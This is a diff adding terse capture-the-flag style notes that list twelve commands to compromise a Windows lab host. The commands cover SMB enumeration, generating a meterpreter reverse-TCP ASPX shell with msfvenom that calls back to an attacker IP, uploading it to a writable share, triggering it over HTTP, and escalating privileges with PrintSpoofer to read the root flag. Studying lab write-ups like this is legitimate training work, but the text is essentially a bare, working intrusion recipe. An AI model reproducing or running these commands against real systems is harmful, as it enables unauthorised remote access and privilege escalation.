@@ -1,0 +1,12 @@
+1 - nmap -A 10.10.49.68
+2 - smbclient -L \\10.10.49.68
+3 - smbclient \\\\10.10.49.68\\nt4wrksv
+4 - echo hash | base64 -d
+5 - msfvenom -p windows/x64/meterpreter_reverse_tcp lhost=10.8.94.51 lport=4444 -f aspx -o shell.aspx
+6 - smbclient \\\\10.10.49.68\\nt4wkrsv -> put shell.aspx
+7 - msfconsole -> use exploit/multi/handler -> set payload windows/x64/meterpreter_reverse_tcp
+8 - http://10.10.49.68:49663/nt4wrksv/shell.aspx
+9 - type C:\Users\Bob\Desktop\user.txt
+10 - upload PrintSpoofer.exe
+11 - PrintSpoofer.exe -i -c powershell.exe
+12 - type C:\Users\Administrator\Desktop\root.txt
